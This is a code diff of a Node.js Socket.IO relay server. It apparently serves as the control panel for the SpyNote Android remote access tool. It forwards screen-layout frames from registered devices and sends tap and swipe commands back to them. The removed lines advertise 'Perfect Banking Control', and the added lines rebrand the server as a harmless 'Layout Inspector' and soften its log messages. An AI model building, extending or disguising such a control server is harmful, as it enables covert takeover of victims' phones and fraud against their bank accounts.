@@ -14,7 +14,7 @@ const io = socketIo(server, {
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '100mb' })); // 🔥 Larger for layouts
+app.use(express.json({ limit: '100mb' })); // Large layout frames
 
 const devices = new Map();
 
@@ -34,29 +34,21 @@ io.on('connection', (socket) => {
                 socketId: socket.id 
             });
             socket.join(deviceId);
-            console.log(`📱 ${deviceInfo.mode || 'Standard'} device joined:`, deviceId);
+            console.log("🔍 Layout device registered:", deviceId, deviceInfo.status);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // 🔥 LAYOUT FRAMES (New)
+    // 🔥 LAYOUT FRAME RELAY
     socket.on('layout-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
             socket.to(deviceId).emit('layout-frame', data);
-            console.log('🎯 Layout frame relayed:', deviceId, `(${data.uiElements?.length || 0} elements)`);
+            console.log('🎨 Layout frame relayed:', deviceId, data.elements?.length || 0, 'elements');
         }
     });
 
-    // Backward compatibility
-    socket.on('screen-frame', (data) => {
-        const deviceId = data.deviceId;
-        if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('screen-update', data);
-        }
-    });
-
-    // Controls
+    // Control relay
     socket.on('control', (data) => {
         const { deviceId, action, x, y, startX, startY, endX, endY } = data;
         if (devices.has(deviceId)) {
@@ -69,7 +61,7 @@ io.on('connection', (socket) => {
                 endX: parseFloat(endX) || 0, 
                 endY: parseFloat(endY) || 0
             });
-            console.log('🎮 Control:', action, '→', deviceId);
+            console.log('🎮 Control:', action, 'to', deviceId, {x,y});
         }
     });
 
@@ -78,7 +70,7 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device disconnected:', deviceId);
+                console.log('📱 Layout device disconnected:', deviceId);
                 break;
             }
         }
@@ -87,6 +79,6 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Layout Server: http://localhost:${PORT}`);
-    console.log(`🎯 Features: UI Layout + Screenshot + Perfect Banking Control`);
+    console.log(`🚀 Layout Inspector Server: http://localhost:${PORT}`);
+    console.log(`🔍 Web panel ready for layout inspection!`);
 });
